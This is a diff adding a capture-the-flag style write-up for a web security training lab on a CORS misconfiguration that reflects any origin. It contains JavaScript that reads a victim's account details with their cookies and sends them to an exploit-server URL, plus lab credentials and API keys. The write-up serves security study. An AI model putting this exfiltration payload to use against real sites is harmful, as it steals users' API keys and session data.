@@ -1,0 +1,53 @@
+Lab #1 - CORS vulnerability with basic origin reflection
+
+Vulnerability - This website has an insecure CORS configuration in that it trusts all origins.
+
+Goal - To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.
+
+Credentials - wiener:peter
+
+Analysis:
+- Log in with account wiener:peter and see an API key of this account.
+- Notice that in the request GET /accountDetails HTTP/2 contains: Sec-Fetch-Mode: cors
+- And the response is:
+HTTP/2 200 OK
+Access-Control-Allow-Credentials: true
+Content-Type: application/json; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 149
+
+{
+  "username": "wiener",
+  "email": "",
+  "apikey": "YhGUOASjGvPmTH4gbYsnFR1JzWQJQhMF",
+  "sessions": [
+    "P3Nm2EDSndNNdat0U3nTiByZdSU3f9nM"
+  ]
+}
+
+=> make use of CORS
+
+- Using Burp Repeater and add Origin into headers with random website => request successfully
+=> it allows arbitrary origin => insecure CORS configuration
+
+- try to create a web page to make a request to /accountDetails:
+<p id="apikey">API KEY</p>
+
+<script>
+    fetch('https://0a3a0046044f841b814a9d9d002a0039.web-security-academy.net/accountDetails', {credentials:'include'})
+        .then(r => r.json())
+        .then(j => document.getElementById('apikey').innerText = j.apikey)
+</script>
+=> It can read API KEY
+
+Solution: 
+- create an HTML webpage: 
+<script>
+    fetch('https://0a3a0046044f841b814a9d9d002a0039.web-security-academy.net/accountDetails', {credentials:'include'})
+        .then(r => r.text())
+        .then(j => {
+          return fetch('https://exploit-0a2e00af043b844481b99c5001de007b.exploit-server.net/log?data=' + encodeURIComponent(j));
+        })
+</script>
+
+- and delivery to victim => see API KEY: nLLKn4gTLgpy3frnABSDzXKpxHEGbHx6
